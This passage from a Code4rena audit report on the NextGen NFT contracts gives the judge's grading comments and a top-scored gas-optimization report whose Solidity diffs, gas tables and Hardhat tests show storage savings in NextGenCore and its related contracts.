**[a2rocket (NextGen) confirmed](https://github.com/code-423n4/2023-10-nextgen-findings/issues/747#issuecomment-1829205971)**

**[0xsomeone (judge) commented](https://github.com/code-423n4/2023-10-nextgen-findings/issues/747#issuecomment-1847378054):**
> The Warden's QA report has been graded A based on a score of 66, combined with a manual review. The Warden's submission's score was assessed based on the following accepted findings:
> 
> **Low-Risk**
> - [02]
> - [05]
> - [15]
> - [16]
> - [17]
> 
> **Non-Critical**
> - [01]
> - [08]
> - [12]
> - [13]
> - [19]
> 
> **Informational**
> - [21]

**[0xsomeone (judge) commented](https://github.com/code-423n4/2023-10-nextgen-findings/issues/747#issuecomment-1847437932):**
 > As this report has been selected as the best, I will provide additional feedback on the points that were not credited in the original assessment above:
> 
> - [03] Desirable Trait of the Protocol, Suitable Criticism for Analysis Submissions
> - [04] Could be Argued as Deliberate [Optimization](https://github.com/code-423n4/2023-10-nextgen/blob/main/bot-report.md#g-19-functions-that-revert-when-called-by-norma0users-can-be-payable)
> - [06] Desirable Trait of the Protocol, Suitable Criticism for Analysis Submissions
> - [07] Inconsequential & Gas Increase
> - [09] Desirable Trait of the Protocol, Suitable Criticism for Analysis Submissions
> - [10] Desirable Trait of the Protocol
> - [11] Preference
> - [14] Informational (Uncredited)
> - [18] Desirable Trait of the Protocol
> - [20] Desirable Trait of the Protocol

*Note: For full discussion, see [here](https://github.com/code-423n4/2023-10-nextgen-findings/issues/747).*

***

# Gas Optimizations

For this audit, 19 reports were submitted by wardens detailing gas optimizations. The [report highlighted below](https://github.com/code-423n4/2023-10-nextgen-findings/issues/191) by **rahul** received the top score from the judge.

*The following wardens also submitted reports: [r0ck3tz](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1938), [JCK](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1876), [K42](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1766), [c3phas](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1558), [thekmj](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1503), [SovaSlava](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1235), [lsaudit](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1183), [MrPotatoMagic](https://github.com/code-423n4/2023-10-nextgen-findings/issues/765), [0xAnah](https://github.com/code-423n4/2023-10-nextgen-findings/issues/424), [petrichor](https://github.com/code-423n4/2023-10-nextgen-findings/issues/2000), [DavidGiladi](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1967), [hunter\_w3b](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1955), [0xSolus](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1914), [dharma09](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1739), [hihen](https://github.com/code-423n4/2023-10-nextgen-findings/issues/447), [leegh](https://github.com/code-423n4/2023-10-nextgen-findings/issues/180), [Tadev](https://github.com/code-423n4/2023-10-nextgen-findings/issues/127), and [epistkr](https://github.com/code-423n4/2023-10-nextgen-findings/issues/15).*

## Summary

| ID | Optimization | Gas Saved |
|---- | ------------------------------|---------------|
| [G-01] | Derive min / max collection bounds dynamically | 54,522 |
| [G-02] | Remove redundant flag for creation of collection | 34,044 |
| [G-03] | Remove duplicate reference to core contract | 28,517 |
| [G-04] | Remove duplicate reference to randomizer contract | 22,761 |
| [G-05] | Remove redundant external call during airdrop | 3066 |
| [G-06] | Optimise creation of collection | 976 |

## [G-01] Derive min / max collection bounds dynamically

**54,522 gas can be saved.**

| Method | Before | After | Gas Saved | Test Passes? |
|-----------|------------|-----------|-----------|--------|
| `NextGenCore:setCollectionData()` | 199090 | 154389 | 44701 | Yes |
| `NextGenCore:burn()` | 84270 | 83948 | 322 | Yes |
| `NextGenCore:setFinalSupply()` | 54949 | 49590 | 5359 | Yes |
| `NextGenCore:mint()` | 529382 | 525242 | 4140 | Yes |

Token min / max index define the valid range of tokens within a collection. There is no need to store them in state variables, as these can be derived using `collectionID` and `collectionTotalSupply` and their values can be read using the getter functions wherever required.

### Recommendation

**STEP 1:**  Update the getter functions:
```diff
    function viewTokensIndexMin(...) {
-       return(collectionAdditionalData[_collectionID].reservedMinTokensIndex);
+       return _collectionID * 10000000000;
    }
```

[Source: smart-contracts/NextGenCore.sol#L383-L385](https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/NextGenCore.sol#L383-L385)

```diff
    function viewTokensIndexMax(...) {
-       return(collectionAdditionalData[_collectionID].reservedMaxTokensIndex);
+       return _collectionID * 10000000000 + collectionAdditionalData[_collectionID].collectionTotalSupply - 1;
	}
```

[Source: smart-contracts/NextGenCore.sol#L389-L391](https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/NextGenCore.sol#L389-L391)

**STEP 2:** Remove declaration:

```diff
    struct collectionAdditonalDataStructure {
        address collectionArtistAddress;
        uint256 maxCollectionPurchases;
        uint256 collectionCirculationSupply;
        uint256 collectionTotalSupply;
-       uint256 reservedMinTokensIndex;
-       uint256 reservedMaxTokensIndex;
        uint setFinalSupplyTimeAfterMint;
        address randomizerContract;
        IRandomizer randomizer;
    }
```

[Source: smart-contracts/NextGenCore.sol#L44-L54](https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/NextGenCore.sol#L44-L54)

**STEP 3:** Remove assignment:

```diff
   function setCollectionData(...) {
       __SNIP__
        if (collectionAdditionalData[_collectionID].collectionTotalSupply == 0) {
            collectionAdditionalData[_collectionID].collectionCirculationSupply = 0;
            collectionAdditionalData[_collectionID].collectionTotalSupply = _collectionTotalSupply;
            collectionAdditionalData[_collectionID].setFinalSupplyTimeAfterMint = _setFinalSupplyTimeAfterMint;
-           collectionAdditionalData[_collectionID].reservedMinTokensIndex = (_collectionID * 10000000000);
-           collectionAdditionalData[_collectionID].reservedMaxTokensIndex = (_collectionID * 10000000000) + _collectionTotalSupply - 1;
            wereDataAdded[_collectionID] = true;
        } 
      __SNIP__
    }
```

[Source: smart-contracts/NextGenCore.sol#L147-L166](https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/NextGenCore.sol#L147-L166)

**STEP 4:** Read value via getter:

```diff
    function burn(uint256 _collectionID, uint256 _tokenId) public {
        __SNIP__
-        require ((_tokenId >= collectionAdditionalData[_collectionID].reservedMinTokensIndex) && (_tokenId <= collectionAdditionalData[_collectionID].reservedMaxTokensIndex), "id err");
+        require ((_tokenId >= this.viewTokensIndexMin(_collectionID)) && (_tokenId <=  this.viewTokensIndexMax(_collectionID)), "id err");
        __SNIP__
    }
```

[Source: smart-contracts/NextGenCore.sol#L204-L209](https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/NextGenCore.sol#L204-L209)

**STEP 5:** Since max value is calculated dynamically, no need to update it on supply change:

```diff
    function setFinalSupply(...) {
     __SNIP__
        collectionAdditionalData[_collectionID].collectionTotalSupply = collectionAdditionalData[_collectionID].collectionCirculationSupply;
-       collectionAdditionalData[_collectionID].reservedMaxTokensIndex = (_collectionID * 10000000000) + collectionAdditionalData[_collectionID].collectionTotalSupply - 1;
    }
```

[Source: smart-contracts/NextGenCore.sol#L307-L311](https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/NextGenCore.sol#L307-L311)

**STEP 6:** Fetch via  value via getter:

```diff
    function getTokenName(...)  {
-       uint256 tok = tokenId - collectionAdditionalData[tokenIdsToCollectionIds[tokenId]].reservedMinTokensIndex;
+       uint256 tok = tokenId - this.viewTokensIndexMin(tokenIdsToCollectionIds[tokenId]);
        __SNIP__
    }
```

[Source: smart-contracts/NextGenCore.sol#L361-L364](https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/NextGenCore.sol#L361-L364)

### POC

![Test Result](https://i.imgur.com/3nYU2eN.png)

### POC test file

<details>

```js
const {
  loadFixture,
  time,
} = require("@nomicfoundation/hardhat-toolbox/network-helpers");
const { expect } = require("chai");
const { ethers } = require("hardhat");
const fixturesDeployment = require("../scripts/fixturesDeployment.js");

let signers;
let contracts;
const MAX_TOTAL_SUPPLY = 10_000_000_000;

describe("Verify removal of min/max params from storage", async function () {
  before(async function () {
    ({ signers, contracts } = await loadFixture(fixturesDeployment));
  });

  it("SHOULD deploy contracts", async function () {
    expect(await contracts.hhAdmin.getAddress()).to.not.equal(
      ethers.ZeroAddress
    );
    expect(await contracts.hhCore.getAddress()).to.not.equal(
      ethers.ZeroAddress
    );
    expect(await contracts.hhDelegation.getAddress()).to.not.equal(
      ethers.ZeroAddress
    );
    expect(await contracts.hhMinter.getAddress()).to.not.equal(
      ethers.ZeroAddress
    );
    expect(await contracts.hhRandomizer.getAddress()).to.not.equal(
      ethers.ZeroAddress
    );
    expect(await contracts.hhRandoms.getAddress()).to.not.equal(
      ethers.ZeroAddress
    );
  });

  it("SHOULD create a collection", async function () {
    await contracts.hhCore.createCollection(
      "TestCollection",
      "Artist 1",
      "For testing",
      "www.test.com",
      "CCO",
      "https://ipfs.io/ipfs/hash/",
      "",
      ["desc"]
    );
  });

  it("SHOULD successfully set min / max params for a collection", async function () {
    const SUPPLY = 1000;

    await contracts.hhCore.setCollectionData(
      1,
      signers.owner.address,
      50,
      SUPPLY,
      100
    );

    expect(await contracts.hhCore.viewTokensIndexMin(1)).eq(
      1 * MAX_TOTAL_SUPPLY
    );

    expect(await contracts.hhCore.viewTokensIndexMax(1)).eq(
      1 * MAX_TOTAL_SUPPLY + (SUPPLY - 1)
    );
  });

  it("SHOULD mint token", async function () {
    await contracts.hhCore.addMinterContract(contracts.hhMinter);
    await contracts.hhCore.addRandomizer(1, contracts.hhRandomizer);
    await contracts.hhMinter.setCollectionCosts(
      1, // _collectionID
      0, // _collectionMintCost
      0, // _collectionEndMintCost
      0, // _rate
      0, // _timePeriod
      1, // _salesOptions
      "0xD7ACd2a9FD159E69Bb102A1ca21C9a3e3A5F771B" // delAddress
    );
    await contracts.hhMinter.setCollectionPhases(
      1, // _collectionID
      1696931278, // _allowlistStartTime
      1696931278, // _allowlistEndTime
      1696931278, // _publicStartTime
      1700019791, // _publicEndTime
      "0x8e3c1713145650ce646f7eccd42c4541ecee8f07040fc1ac36fe071bbfebb870" // _merkleRoot
    );
    await contracts.hhMinter.mint(
      1, // _collectionID
      2, // _numberOfTokens
      0, // _maxAllowance
      '{"tdh": "100"}', // _tokenData
      signers.owner.address, // _mintTo
      ["0x8e3c1713145650ce646f7eccd42c4541ecee8f07040fc1ac36fe071bbfebb870"], // _merkleRoot
      signers.addr1.address, // _delegator
      2 //_varg0
    );
  });

  it("SHOULD burn valid token", async function () {
    let min = await contracts.hhCore.viewTokensIndexMin(1);
    await expect(contracts.hhCore.burn(1, min)).not.to.be.reverted;
    expect(await contracts.hhCore.balanceOf(signers.owner.address)).eq(1);
  });

  it("SHOULD successfully set final supply", async function () {
    await time.increaseTo(1700019900);
    await expect(contracts.hhCore.setFinalSupply(1)).not.to.be.reverted;
  });

    it("SHOULD successfully get token name", async function () {
      let min = await contracts.hhCore.viewTokensIndexMin(1);
      // @audit getTokenName was changed to public for the purpose of unit testing.
      expect(await contracts.hhCore.getTokenName(min + 1n)).to.be.eq(
        "TestCollection #1"
      );
    });
});
```

</details>

## [G-02] Remove redundant flag for creation of collection

**34,044 gas can be saved.**

| Method  | Before | After | Gas Saved | Test Passes? |
|--------------------|---------|-----------|---------|-----|
| `NextGenCore:createCollection()` | 252555 | 230253 | 22302 | Yes |
| `NextGenCore:setCollectionData()` | 199078 | 199031 | 47 | Yes |
| `NextGenCore:updateCollectionInfo()` | 51993 | 51946 | 47 | Yes |
| `NextGenCore:changeMetadataView()` | 62755 | 62708 | 47 | Yes |
| `NextGenCore:freezeCollection()` | 57073 | 57026 | 47 | Yes |

| Deployment | Before | After | Gas Saved |
|----------------|------------|-----------|---------------|
| `NextGenCore` | 5501771 | 5490217 | 11554 |

### Recommendation

The `NextGenCore.sol` contract uses a storage variable called `isCollectionCreated` to check if a collection has been created. 

Alternatively, the existence of a collection can also be verified by checking if the `collectionID` is less than `newCollectionIndex`, since all existing collections will have a value that is less than `newCollectionIndex`. This optimization saves an expensive storage write during contract creation:

**STEP 1:** Remove the storage variable declaration, and write from `createCollection()`:

```diff
__SNIP__
- mapping (uint256 => bool) private isCollectionCreated;
__SNIP__

    function createCollection(...) {
        collectionInfo[newCollectionIndex].collectionName = _collectionName;
        collectionInfo[newCollectionIndex].collectionArtist = _collectionArtist;
        collectionInfo[newCollectionIndex].collectionDescription = _collectionDescription;
        collectionInfo[newCollectionIndex].collectionWebsite = _collectionWebsite;
        collectionInfo[newCollectionIndex].collectionLicense = _collectionLicense;
        collectionInfo[newCollectionIndex].collectionBaseURI = _collectionBaseURI;
        collectionInfo[newCollectionIndex].collectionLibrary = _collectionLibrary;
        collectionInfo[newCollectionIndex].collectionScript = _collectionScript;
-       isCollectionCreated[newCollectionIndex] = true;
        newCollectionIndex = newCollectionIndex + 1;
    }
__SNIP__
```

[Source: smart-contracts/NextGenCore.sol#L62](https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/NextGenCore.sol#L62)

[Source: smart-contracts/NextGenCore.sol#L139](https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/NextGenCore.sol#L139)

**STEP 2:** Refactor the require statements to verify using `newCollectionIndex` instead in `setCollectionData()`, `updateCollectionInfo()`, `changeMetadataView()`, and  `freezeCollection()`. It also verifies that `collectionID` greater than zero since `newCollectionIndex` starts with 1.

```diff
- require((isCollectionCreated[_collectionID] == true) && (collectionFreeze[_collectionID] == false) && (_collectionTotalSupply <= 10000000000), "err/freezed");
+ require((_collectionID > 0 && _collectionID < newCollectionIndex) && (collectionFreeze[_collectionID] == false) && (_collectionTotalSupply <= 10000000000), "err/freezed");
```

[Source: smart-contracts/NextGenCore.sol#L148](https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/NextGenCore.sol#L148)

```diff
- require((isCollectionCreated[_collectionID] == true) && (collectionFreeze[_collectionID] == false), "Not allowed");
+ require((_collectionID > 0 && _collectionID < newCollectionIndex) && (collectionFreeze[_collectionID] == false), "Not allowed");
```

[Source: smart-contracts/NextGenCore.sol#L239](https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/NextGenCore.sol#L239)

```diff
- require((isCollectionCreated[_collectionID] == true) && (collectionFreeze[_collectionID] == false), "Not allowed");
+ require(( _collectionID > 0 && _collectionID < newCollectionIndex) && (collectionFreeze[_collectionID] == false), "Not allowed");
```

[Source: smart-contracts/NextGenCore.sol#L267](https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/NextGenCore.sol#L267)

```diff
- require(isCollectionCreated[_collectionID] == true, "No Col");
+ require((_collectionID > 0 && _collectionID < newCollectionIndex), "No Col");
```

[Source: smart-contracts/NextGenCore.sol#L293](https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/NextGenCore.sol#L293)

### POC

![Test Result](https://i.imgur.com/efAqtwT.png)

### POC test file

<details>

```js
const {
  loadFixture,
} = require("@nomicfoundation/hardhat-toolbox/network-helpers");
const { expect } = require("chai");
const { ethers } = require("hardhat");
const fixturesDeployment = require("../scripts/fixturesDeployment.js");

let signers;
let contracts;

describe("verify removal of `isCollectionCreated` storage variable", async function () {
  before(async function () {
    ({ signers, contracts } = await loadFixture(fixturesDeployment));
  });

  it("SHOULD deploy contracts", async function () {
    expect(await contracts.hhAdmin.getAddress()).to.not.equal(
      ethers.ZeroAddress
    );
    expect(await contracts.hhCore.getAddress()).to.not.equal(
      ethers.ZeroAddress
    );
    expect(await contracts.hhDelegation.getAddress()).to.not.equal(
      ethers.ZeroAddress
    );
    expect(await contracts.hhMinter.getAddress()).to.not.equal(
      ethers.ZeroAddress
    );
    expect(await contracts.hhRandomizer.getAddress()).to.not.equal(
      ethers.ZeroAddress
    );
    expect(await contracts.hhRandoms.getAddress()).to.not.equal(
      ethers.ZeroAddress
    );
  });

  it("SHOULD revert when setting data on non existent collection", async function () {
    await expect(
      contracts.hhCore.setCollectionData(1, signers.owner.address, 50, 100, 100)
    ).to.be.revertedWith("err/freezed");
  });

  it("SHOULD revert when updating non existent collection", async function () {
    await expect(
      contracts.hhCore.updateCollectionInfo(
        1,
        "Test Collection 1",
        "Artist 1",
        "For testing",
        "www.test.com",
        "CCO",
        "https://ipfs.io/ipfs/hash/",
        "",
        999,
        ["desc"]
      )
    ).to.be.revertedWith("Not allowed");
  });

  it("SHOULD revert when changing meta data of a non existent collection", async function () {
    await expect(
      contracts.hhCore.changeMetadataView(1, true)
    ).to.be.revertedWith("Not allowed");
  });

  it("SHOULD revert when freezing non existent collection", async function () {
    await expect(contracts.hhCore.freezeCollection(1)).to.be.revertedWith(
      "No Col"
    );
  });

  it("SHOULD create a collection", async function () {
    await contracts.hhCore.createCollection(
      "Test Collection 1",
      "Artist 1",
      "For testing",
      "www.test.com",
      "CCO",
      "https://ipfs.io/ipfs/hash/",
      "",
      ["desc"]
    );
  });

  it("SHOULD succeed when setting data on an existing collection", async function () {
    await expect(
      contracts.hhCore.setCollectionData(1, signers.owner.address, 50, 100, 100)
    ).not.to.be.revertedWith("err/freezed");
  });

  it("SHOULD succeed when updating an existing collection", async function () {
    await expect(
      contracts.hhCore.updateCollectionInfo(
        1,
        "Test Collection 1",
        "Artist 1",
        "For testing",
        "www.test.com",
        "CCO",
        "https://ipfs.io/ipfs/hash/",
        "",
        999,
        ["desc"]
      )
    ).not.to.be.revertedWith("Not allowed");
  });

  it("SHOULD succeed when changing meta data of an existing collection", async function () {
    await expect(
      contracts.hhCore.changeMetadataView(1, true)
    ).not.to.be.revertedWith("Not allowed");
  });

  it("SHOULD succeed when freezing an existing collection", async function () {
    await expect(contracts.hhCore.freezeCollection(1)).not.to.be.revertedWith(
      "No Col"
    );
  });
});
```

</details>

## [G-03] Remove duplicate reference to core contract

**28,517 gas can be saved.**

| Method | Before | After | Gas Saved | Test Passes? |
|------------|------------|-----------|-------|----------|
| `NextGenMinterContract:airDropTokens()` | 744940 | 742940 | 2000 | Yes |
| `NextGenCore:mint()` | 404474 | 402474 | 2000 | Yes |

| Deployment       | Before | After | Gas Saved |
|-----------------|------------|-----------|---------------|
| `NextGenRandomizerNXT` | 634074 | 609557 | 24517 |

### Recommendation

This variable is redundant because the `gencoreContract` variable is already used to store the address of the Gencore contract. The `gencore` variable is only used in the `calculateTokenHash` function, which could be easily updated to use the `gencoreContract` variable instead.

**STEP 1:** Remove deceleration:

```diff
contract NextGenRandomizerNXT {

    IXRandoms public randoms;
    INextGenAdmins private adminsContract;
    INextGenCore public gencoreContract;
    // @audit redundant storage variable
-    address gencore;  
}
```

**STEP 2:** Remove assignment from constructor:

```diff
    constructor(address _randoms, address _admin, address _gencore) {
        randoms = IXRandoms(_randoms);
        adminsContract = INextGenAdmins(_admin);
-       gencore = _gencore;
        gencoreContract = INextGenCore(_gencore);
    }
```

**STEP 3:**  Remove assignment from `updateCoreContract`:

```diff
    function updateCoreContract(address _gencore) public FunctionAdminRequired(this.updateCoreContract.selector) { 
-       gencore = _gencore;
        gencoreContract = INextGenCore(_gencore);
    }
```

**STEP 4:** Update `calculateTokenHash`:

```diff
    // function that calculates the random hash and returns it to the gencore contract
    function calculateTokenHash(uint256 _collectionID, uint256 _mintIndex, uint256 _saltfun_o) public {
-       require(msg.sender == gencore);
+       require(msg.sender == address(gencoreContract))
        bytes32 hash = keccak256(abi.encodePacked(_mintIndex, blockhash(block.number - 1), randoms.randomNumber(), randoms.randomWord()));
        gencoreContract.setTokenHash(_collectionID, _mintIndex, hash);
    }
```

### POC 

This can be verified using existing test suite.

## [G-04] Remove duplicate reference to randomizer contract

**22,761 gas can be saved.**

| Method | Before | After | Gas Saved | Test Passes? |
|------------|------------|-----------|---------|----------|
| `NextGenCore:addRandomizer()` | 70696 | 53535 | 17161 | Yes |
| `NextGenMinterContract::mint()` | 404474 | 402474 | 2000 | Yes |
| `NextGenMinterContract::airDropTokens()` | 744940 | 742940 | 2000 | Yes |
| `NextGenMinterContract::burnToMint()` | 276474 | 274874 | 1600 | Yes |

### Recommendation

It is sufficient to only store the address of the randomizer in `collectionAdditonalDataStructure`.  The randomizer contract instance can be referenced by providing this address to `IRandomizer` interface. The gas savings also cascade to critical operations such as `mint` , `burnToMint`, and `airDropTokens`. 

**STEP 1:** Remove duplicate declaration from struct:

```diff
    struct collectionAdditonalDataStructure {
        address collectionArtistAddress;
        uint256 maxCollectionPurchases;
        uint256 collectionCirculationSupply;
        uint256 collectionTotalSupply;
        uint256 reservedMinTokensIndex;
        uint256 reservedMaxTokensIndex;
        uint setFinalSupplyTimeAfterMint;
        address randomizerContract;
-       IRandomizer randomizer;
    }
```

[Source: smart-contracts/NextGenCore.sol#L44-L54](https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/NextGenCore.sol#L44-L54)

**Step 2:** Remove the duplicate assignment:

```diff
function addRandomizer(...) {
		__SNIP__        
	collectionAdditionalData[_collectionID].randomizerContract = _randomizerContract;
-   collectionAdditionalData[_collectionID].randomizer = IRandomizer(_randomizerContract);
}
```

[Source: smart-contracts/NextGenCore.sol#L170-L174](https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/NextGenCore.sol#L170-L174)

**Step 3:** Get randomizer instance using `IRandomizer` interface:

```diff
    function _mintProcessing(...) internal {
      __SNIP__
-    collectionAdditionalData[_collectionID].randomizer.calculateTokenHash(_collectionID, _mintIndex, _saltfun_o);
+    IRandomizer(collectionAdditionalData[_collectionID].randomizerContract).calculateTokenHash(_collectionID, _mintIndex, _saltfun_o);
	 __SNIP__
    }
```

[Source: smart-contracts/NextGenCore.sol#L229](https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/NextGenCore.sol#L229)

Optionally, for ease of understanding struct property could be renamed from `randomizerContract` to `randomizerContractAddress`.

### POC

![Test result](https://i.imgur.com/g7uU9GK.png)

### POC test file

POC can be verified using the existing test suite by adding the following test to cover `burnToMint`:

```js
    context("Verify `burnToMint`", async function () {
      it("SHOULD burn existing token and mint a new one", async function () {
        contracts.hhCore.tokenOfOwnerByIndex();
        await contracts.hhMinter.initializeBurn(1, 3, true);
        await expect(
          contracts.hhMinter
            .connect(signers.addr1)
            .burnToMint(1, 10000000000, 3, 2, {
              value: await contracts.hhMinter.getPrice(3),
            })
        ).to.not.be.reverted;

        expect(await contracts.hhCore.ownerOf(30000000002)).to.be.eq(
          signers.addr1.address
        );
      });
    });
```

## [G-05] Remove redundant external call during airdrop

**3066 gas can saved.**

| Method | Before | After | Gas Saved | Test Passes? |
|---------|------------|-----------|------|-------------|
| `NextGenMinterContract:airDropTokens()` | 1126101 | 1123035 | 3066 | Yes |

### Recommendation

```diff
    function airDropTokens(...) {
-       require(gencore.retrievewereDataAdded(_collectionID) == true, "Add data");
        uint256 collectionTokenMintIndex;
        for (uint256 y=0; y< _recipients.length; y++) {
            collectionTokenMintIndex = gencore.viewTokensIndexMin(_collectionID) + gencore.viewCirSupply(_collectionID) + _numberOfTokens[y] - 1;
            require(collectionTokenMintIndex <= gencore.viewTokensIndexMax(_collectionID), "No supply");
            }
        }
    }
```

[Source: smart-contracts/MinterContract.sol#L182](https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/MinterContract.sol#L182) 

The removed line of code checks to see if the collection data has been added. If it has not, the function reverts with the error message "Add data". As discussed in [G-4], `retrievewereDataAdded` returns true only once total supply is added. The function later checks to see if the total tokens to be airdropped is within total supply. If they are not, the function will revert with the error message "No supply". Therefore, the first check for whether the collection data has been added is not necessary.

### POC

![Test Result](https://i.imgur.com/xNlDPtN.png)

### POC test file

```js
const {
  loadFixture,
} = require("@nomicfoundation/hardhat-toolbox/network-helpers");
const { expect } = require("chai");
const { ethers } = require("hardhat");
const fixturesDeployment = require("../scripts/fixturesDeployment.js");

let signers;
let contracts;

describe("verify removal of redundant external call from airdropTokens", async function () {
  before(async function () {
    ({ signers, contracts } = await loadFixture(fixturesDeployment));
  });

  it("SHOULD deploy contracts", async function () {
    expect(await contracts.hhAdmin.getAddress()).to.not.equal(
      ethers.ZeroAddress
    );
    expect(await contracts.hhCore.getAddress()).to.not.equal(
      ethers.ZeroAddress
    );
    expect(await contracts.hhDelegation.getAddress()).to.not.equal(
      ethers.ZeroAddress
    );
    expect(await contracts.hhMinter.getAddress()).to.not.equal(
      ethers.ZeroAddress
    );
    expect(await contracts.hhRandomizer.getAddress()).to.not.equal(
      ethers.ZeroAddress
    );
    expect(await contracts.hhRandoms.getAddress()).to.not.equal(
      ethers.ZeroAddress
    );
  });

  it("SHOULD create a collection and setup collection", async function () {
    await contracts.hhCore.createCollection(
      "Test Collection 1",
      "Artist 1",
      "For testing",
      "www.test.com",
      "CCO",
      "https://ipfs.io/ipfs/hash/",
      "",
      ["desc"]
    );

    await contracts.hhCore.addMinterContract(contracts.hhMinter);
    await contracts.hhCore.addRandomizer(1, contracts.hhRandomizer);
  });

  it("SHOULD revert when attempting to airdrop when collection is NOT added", async function () {
    await expect(
      contracts.hhMinter.airDropTokens(
        [signers.addr1.address],
        ["data"],
        [1],
        1,
        [5]
      )
    ).to.be.revertedWith("No supply");
  });
  it("SHOULD successfully airdrop tokens when collection data is added", async function () {
    await contracts.hhCore.setCollectionData(
      1,
      signers.owner.address,
      50,
      500,
      100
    );
    await contracts.hhMinter.airDropTokens(
      [signers.addr1.address],
      ["data"],
      [1],
      1,
      [5]
    );
    expect(await contracts.hhCore.balanceOf(signers.addr1.address)).eq(5);
  });
});
```

## [G-06] Optimize creation of collection

**976 gas can be saved.**

| Method | Before | After | Gas Saved | Test Passes? |
|--------|------------|-----------|------|---------|
| `NextGenCore:createCollection()` | 252555 | 251579 | 976 | Yes |

### Recommendation

Refactoring the creation of a collection, a critical entry point, into simpler code can save gas:

```diff
    function createCollection(...) {
-        collectionInfo[newCollectionIndex].collectionName = _collectionName;
-        collectionInfo[newCollectionIndex].collectionArtist = _collectionArtist;
-        collectionInfo[newCollectionIndex].collectionDescription = _collectionDescription;
-        collectionInfo[newCollectionIndex].collectionWebsite = _collectionWebsite;
-        collectionInfo[newCollectionIndex].collectionLicense = _collectionLicense;
-        collectionInfo[newCollectionIndex].collectionBaseURI = _collectionBaseURI;
-        collectionInfo[newCollectionIndex].collectionLibrary = _collectionLibrary;
-        collectionInfo[newCollectionIndex].collectionScript = _collectionScript;
-        isCollectionCreated[newCollectionIndex] = true;
-        newCollectionIndex = newCollectionIndex + 1;
 
+       isCollectionCreated[newCollectionIndex] = true;
+       collectionInfo[newCollectionIndex++] = collectionInfoStructure(
+           _collectionName,
+           _collectionArtist,
+           _collectionDescription,
+           _collectionWebsite,
+           _collectionLicense,
+           _collectionBaseURI,
+           _collectionLibrary,
+           _collectionScript
+       );
	}
```

[Source: smart-contracts/NextGenCore.sol#L130-L141](https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/NextGenCore.sol#L130-L141)

### POC 

This can be verified using existing test suite.

*Note: For full discussion, see [here](https://github.com/code-423n4/2023-10-nextgen-findings/issues/191).*

***

# Audit Analysis

For this audit, 19 analysis reports were submitted by wardens. An analysis report examines the codebase as a whole, providing observations and advice on such topics as architecture, mechanism, or approach. The [report highlighted below](https://github.com/code-423n4/2023-10-nextgen-findings/issues/2005) by **MrPotatoMagic** received the top score from the judge.

*The following wardens also submitted reports: [dimulski](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1888), [K42](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1841), [dy](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1563), [Toshii](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1472), [JohnnyTime](https://github.com/code-423n4/2023-10-nextgen-findings/issues/926), [catellatech](https://github.com/code-423n4/2023-10-nextgen-findings/issues/772), [Kose](https://github.com/code-423n4/2023-10-nextgen-findings/issues/2026), [Fulum](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1989), [clara](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1962), [hunter\_w3b](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1951), [SAAJ](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1823), [ihtishamsudo](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1690), [cats](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1526), [3th](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1442), [niki](https://github.com/code-423n4/2023-10-nextgen-findings/issues/844), [glcanvas](https://github.com/code-423n4/2023-10-nextgen-findings/issues/487), [peanuts](https://github.com/code-423n4/2023-10-nextgen-findings/issues/347), and [digitizeworx](https://github.com/code-423n4/2023-10-nextgen-findings/issues/114).*


# Analysis Report

## Preface

This audit report should be approached with the following points in mind:

 - The report does not include repetitive documentation that the team is already aware of. It does include suggestions to provide more clarity on certain aspects in the documentation.
 - The report is crafted towards providing the sponsors with value such as unknown edge case scenarios, faulty developer assumptions and unnoticed architecture-level weak spots.
